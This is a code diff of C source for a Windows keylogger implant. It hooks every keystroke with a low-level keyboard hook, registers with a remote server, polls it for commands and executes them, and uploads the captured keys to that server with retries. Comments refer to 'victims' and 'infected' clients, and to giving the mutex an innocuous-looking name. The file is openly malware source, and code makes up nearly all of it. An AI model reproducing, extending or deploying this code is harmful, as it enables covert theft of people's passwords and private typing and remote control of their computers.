@@ -6,7 +6,38 @@
 #include "program.h"
 #include "../client/commands.h"
 
+/**
+ * to make HTTPS traffic you can simply add the  INTERNET_FLAG_SECURE flag
+ */
+
 PROGRAM_CONTEXT* progContext;
+
+ERR_CODE setup() {
+    // initialise PROGRAM_CONTEXT struct then register with the server
+    progContext = initProgramContext();
+    if (progContext == NULL) return ECODE_NULL;
+    printf("1) Program Init'ed\n");
+
+    // register client 
+    int ret = registerClient(progContext->client);
+    if (ret != ECODE_SUCCESS) return ret;
+    printf("2) Cli Registered\n");
+
+    // give the mutex a somehwat believeable name :) FALSE means we don't have to release from main thread
+    HANDLE hMutThrSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
+    if (hMutThrSync == NULL) return ECODE_NULL;
+    printf("3) Thread Sync Mutex Created\n\n");
+
+    // mutex already exists!
+    // THIS CODE IS COMMENTED FOR TESTING ONLY, THIS WAY WE CAN HAVE MULTIPLE VICTIMS ON THE SAME MACHINE!
+    // if (GetLastError() == ERROR_ALREADY_EXISTS) {
+    //     printf("Client is already infected!");
+    //     return 1;
+    // }
+
+    progContext->hMutexThreadSync = hMutThrSync;
+    return ECODE_SUCCESS;
+}
 
 /**
  * initialises a new program context which will how handles to the worker threads 
@@ -32,13 +63,13 @@ PROGRAM_CONTEXT* initProgramContext() {
     }
 
     // install the LowLevelKeyboardProc and set the hook
-    // HINSTANCE hInstance = GetModuleHandle(NULL);
-    prCon->hLowLevelKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, lowLevelKeyboardProc, NULL, 0);
+    prCon->hLowLevelKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, lowLevelKeyboardProc, NULL, 0);
     if (prCon->hLowLevelKeyHook == NULL) {
         programContextCleanup(prCon);
         return NULL;
     }
 
+    prCon->mainThreadId = GetCurrentThreadId();
     prCon->hCmdThread = NULL;
     prCon->hWriteThread = NULL;
     prCon->hMutexThreadSync = NULL;
@@ -46,39 +77,13 @@ PROGRAM_CONTEXT* initProgramContext() {
     return prCon;
 }
 
-ERR_CODE setup() {
-    // initialise PROGRAM_CONTEXT struct then register with the server
-    progContext = initProgramContext();
-    if (progContext == NULL) return ECODE_NULL;
-    printf("1) Program Init'ed\n");
-
-    // register client 
-    int ret = registerClient(progContext->client);
-    if (ret != ECODE_SUCCESS) return ret;
-    printf("2) Cli Registered\n");
-
-    // give the mutex a somehwat believeable name :) FALSE means we don't have to release from main thread
-    HANDLE hMutThrSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
-    if (hMutThrSync == NULL) return ECODE_NULL;
-    printf("4) Thread Sync. Mutex Created\n\n");
-
-    // mutex already exists!
-    // THIS CODE IS COMMENTED FOR TESTING ONLY, THIS WAY WE CAN HAVE MULTIPLE VICTIMS ON THE SAME MACHINE!
-    // if (GetLastError() == ERROR_ALREADY_EXISTS) {
-    //     printf("Client is already infected!");
-    //     return 1;
-    // }
-
-    progContext->hMutexThreadSync = hMutThrSync;
-    return ECODE_SUCCESS;
-}
 
 // ----------------------
 // --- thread section ---
 // ----------------------
 
 ERR_CODE startThreads() {
-    // create the worker threads (also nice pattern)
+    // create the worker threads
     HANDLE hCmdThr = CreateThread(NULL, 0, commandsAndBeaconThread, NULL, 0, NULL);
     HANDLE hWriteThr = CreateThread(NULL, 0, writeLogThread, NULL, 0, NULL);
 
@@ -114,16 +119,14 @@ DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam) {
         CLIENT_HANDLER* client = progContext->client;
 
         // get the commands from the server
-        int ret = pollCommandsAndBeacon(client);
-        if (ret != ECODE_SUCCESS) printf("%s\n", getErrMessage(ret));
+        ERR_CODE ret = pollCommandsAndBeacon(client);
+        if (ret != ECODE_SUCCESS) printf("ECODE: %s\n", getErrMessage(ret));
         
         // only try and execute the commands if there is something to exec.
         if (strlen(client->cmdBuffer) > 0) {
-            printf("|T1| 2.1 Executing the following cmds:\n%s\n\n", client->cmdBuffer);
             ret = executeCommands(client);
-            if (ret != ECODE_SUCCESS) printf("%s\n", getErrMessage(ret));
-        } else {
-            printf("|T1| 2.1 No commands to execute...\n\n");
+            if (ret == ECODE_DO_SHUTDOWN) doShutdown();
+            if (ret != ECODE_SUCCESS)     printf("ECODE: %s\n", getErrMessage(ret));
         }
 
         ReleaseMutex(progContext->hMutexThreadSync);
@@ -132,8 +135,14 @@ DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam) {
     return 0;
 }
 
+void doShutdown() {
+    progContext->shutdown = TRUE;  // set the shutdown flag
+    // post a message to the main thread, this will cause it to stop!
+    PostThreadMessageA(progContext->mainThreadId, WM_QUIT, 0, 0);
+}
+
 /**
- * function that executes infinitely until shd command is given. 
+ * Function that executes infinitely until shd command is given. 
  * Every 10 seconds it attempts to write the captured keys to the server logs
  * 
  * Important note: similar to before, if the key buffer is empty, then don't 
@@ -143,16 +152,27 @@ DWORD WINAPI writeLogThread(LPVOID lpParam) {
     while (!progContext->shutdown) {
         WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);
 
-        KEY_LOGGER_STATE* kLogger = progContext->kLogger;
+        KEY_LOGGER* kLogger = progContext->kLogger;
 
-        // again, we only try and write if there is something to write!
-        if (strlen(kLogger->keyBuffer) > 0) {
-            printf("|T2| 1.1 Writing key buffer.");
-            // int ret = writeBuffer(kLogger); // TODO/FIX
-            // if (ret != ECODE_SUCCESS) printf("%s\n", getErrMessage(ret));
+        // skip the write if the buffer is empty
+        if (kLogger->bufferPtr == 0)
+            goto skipWrite;
+
+        // tries the to write the key buffer, if the post request failed try at max 2 times more
+        int ret = writeKeyLog(progContext->client, kLogger->keyBuffer, (kLogger->bufferPtr) - 1);
+        int i = 1;
+        while (ret == ECODE_POST && ++i <= 3)
+            ret = writeKeyLog(progContext->client, kLogger->keyBuffer, (kLogger->bufferPtr) - 1);
+
+        if (ret == ECODE_SUCCESS) {
+            // reset buffer ptr, no need to reset the buffer memory
+            kLogger->bufferPtr = 0;
+            kLogger->keyBuffer[0] = '\0';
         } else {
-            printf("|T2| 1.1 Key buffer was empty, skipping write.\n\n");
+            printf("ECODE: %d\n", ret);
         }
+
+        skipWrite:
 
         ReleaseMutex(progContext->hMutexThreadSync);
         Sleep(SLP_WRITER_THREAD);
@@ -162,21 +182,25 @@ DWORD WINAPI writeLogThread(LPVOID lpParam) {
 
 /**
  * key logger loop that runs on the main thread!
- * Most of the time it will just be aquiring and then immediately releasing the mutex
- * to itself, however, on the off chance it collides with the other threads we need
- * to ensure there won't be some ghastly behaviour, even if it means we lose some 
- * information whilst some netowrk requests are occurring 
+ * This method simply calls the blocking method GetMessageA, this waits for 
+ * a message to be posted to this thread. As such, the keylogger terminates 
+ * when the shutdown command is sent, which envokes the doShutdown method
+ * which posts a message to the main thread!
+ * Resources: https://stackoverflow.com/questions/73340668/how-to-process-key-down-state-on-lowlevelkeyboardproc-with-wh-keyboard
  */
 ERR_CODE runKeyLogger() {
-    // run loop, GetMessage keeps the thread alive and polls key presses etc
     MSG msg;
-    while (!progContext->shutdown && GetMessage(&msg, NULL, 0, 0)) {
+    while (!progContext->shutdown && GetMessageA(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessageA(&msg);
     }
     return ECODE_SUCCESS;
 }
 
+/**
+ * Call back function evoked on every key press, as set by the 
+ * SetWindowsHookExA function
+ */
 LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     KBDLLHOOKSTRUCT *keyPress = (KBDLLHOOKSTRUCT *)lParam;
     DWORD vkCode = keyPress->vkCode;
